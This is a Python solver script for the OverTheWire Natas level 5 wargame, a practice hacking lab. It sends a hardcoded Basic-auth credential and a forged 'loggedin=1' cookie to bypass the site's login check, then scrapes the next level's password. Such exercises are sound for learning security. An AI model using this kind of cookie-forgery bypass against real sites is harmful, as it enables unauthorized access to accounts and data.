#!/usr/bin/python3
#usage sudo ./natas5.natas.labs.overthewire.org.py 
#Script Made by KRN BHARGAV
#This script is made on the basis to clear the natas5 level of the overthewire hack challenge
#The purpose of this script is not to disclose the level solution 
#I made this script only to practice by scripting skills eventually used by hackers
#FOR FURTHER QUERIES OR ERROR CONTACT USING MY INSTAGRAM ACCOUNT krn_bhargav.

import requests # to made the http request to website
import sys # to exit the script essepecially
from time import * # to make the script more debug
from bs4 import BeautifulSoup # to parse the website html content

#this function make the request to paramterical url supplied by main funciton 
def geturl(url):
	print("[*]Testing '%s' " % url)
	sleep(1)
	#This script required some headers to access the website
	#upon requesting the website it prompt us for the authentication.
	#for this i use the burpsuite to extract the session.
	#for the reason why use the cookie: loggedin = 1,explaination given below. 
	required_header = {"Authorization":"Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx","cookie":"loggedin=1"}
	try:
		req = requests.get(url,headers= required_header)
		if req.status_code == 200: # if i get status_code 200 from the website only
			headers = req.headers
			sleep(2)
			print("")
			for key in headers:
				print("%s : %s" % (key,headers[key]))
			#after getting the headers i analyse that the Set-Cookie header loggedin=1	
			#this header simply setthe cookie loggedin =1
			print("")
			print("[+]Setting cookie : loggedin=1")
			sleep(1)
			print("[+]Getting the password for the natas5.")
			sleep(2)
			#after this i grab some required data by parsing some html content.
			#BeautifulSoup required the rext form of html source so i pass it.
			webpage = BeautifulSoup(req.text,"html.parser") # using BeautifulSoup to parse the html webpage
			password = webpage.find("div",{"id":"content"})
			print(password.text)
			print("")
			sleep(1)
		else:
			print("[-]Unable to get the header from website.")	
	except Exception as e:
		print(e)
		sleep(1)
		sys.exit(0)			
def main():
	print("This is python script to experiment on the natas5 experiment.")
	sleep(2)
	url = "http://natas5.natas.labs.overthewire.org"
	geturl(url)


if __name__ == "__main__":
	main()	